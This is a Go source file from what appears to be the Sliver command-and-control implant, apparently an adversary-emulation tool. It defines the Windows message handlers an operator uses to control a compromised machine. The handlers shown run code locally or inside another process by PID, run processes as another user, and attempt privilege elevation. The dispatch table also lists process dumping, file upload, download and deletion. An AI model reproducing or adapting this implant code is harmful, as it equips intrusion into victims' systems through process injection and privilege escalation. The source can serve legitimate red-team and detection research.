package main

import (
	// {{if .Debug}}
	"log"
	// {{else}}{{end}}

	pb "sliver/protobuf/sliver"
	"sliver/sliver/priv"
	"sliver/sliver/taskrunner"

	"github.com/golang/protobuf/proto"
)

var (
	windowsHandlers = map[uint32]RPCHandler{
		pb.MsgTask:           taskHandler,
		pb.MsgRemoteTask:     remoteTaskHandler,
		pb.MsgProcessDumpReq: dumpHandler,
		pb.MsgImpersonateReq: impersonateHandler,
		pb.MsgElevateReq:     elevateHandler,

		pb.MsgPsListReq:   psHandler,
		pb.MsgPing:        pingHandler,
		pb.MsgKill:        killHandler,
		pb.MsgDirListReq:  dirListHandler,
		pb.MsgDownloadReq: downloadHandler,
		pb.MsgUploadReq:   uploadHandler,
		pb.MsgCdReq:       cdHandler,
		pb.MsgPwdReq:      pwdHandler,
		pb.MsgRmReq:       rmHandler,
		pb.MsgMkdirReq:    mkdirHandler,
	}
)

func getSystemHandlers() map[uint32]RPCHandler {
	return windowsHandlers
}

// ---------------- Windows Handlers ----------------
func taskHandler(data []byte, resp RPCResponse) {
	task := &pb.Task{}
	err := proto.Unmarshal(data, task)
	if err != nil {
		// {{if .Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}

	err = taskrunner.LocalTask(task.Data)
	resp([]byte{}, err)
}

func remoteTaskHandler(data []byte, resp RPCResponse) {
	remoteTask := &pb.RemoteTask{}
	err := proto.Unmarshal(data, remoteTask)
	if err != nil {
		// {{if .Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}
	err = taskrunner.RemoteTask(int(remoteTask.Pid), remoteTask.Data)
	resp([]byte{}, err)
}

func impersonateHandler(data []byte, resp RPCResponse) {
	impersonateReq := &pb.ImpersonateReq{}
	err := proto.Unmarshal(data, impersonateReq)
	if err != nil {
		// {{if .Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}
	out, err := priv.RunProcessAsUser(impersonateReq.Username, impersonateReq.Process, impersonateReq.Args)
	if err != nil {
		resp([]byte{}, err)
		return
	}
	impersonate := &pb.Impersonate{
		Output: out,
	}
	data, err = proto.Marshal(impersonate)
	resp(data, err)
}

func elevateHandler(data []byte, resp RPCResponse) {
	elevateReq := &pb.ElevateReq{}
	err := proto.Unmarshal(data, elevateReq)
	if err != nil {
		// {{if .Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}
	elevate := &pb.Elevate{}
	err = priv.Elevate()
	if err != nil {
		elevate.Err = err.Error()
		elevate.Success = false
	} else {
		elevate.Success = true
		elevate.Err = ""
	}
	data, err = proto.Marshal(elevate)
	resp(data, err)
}
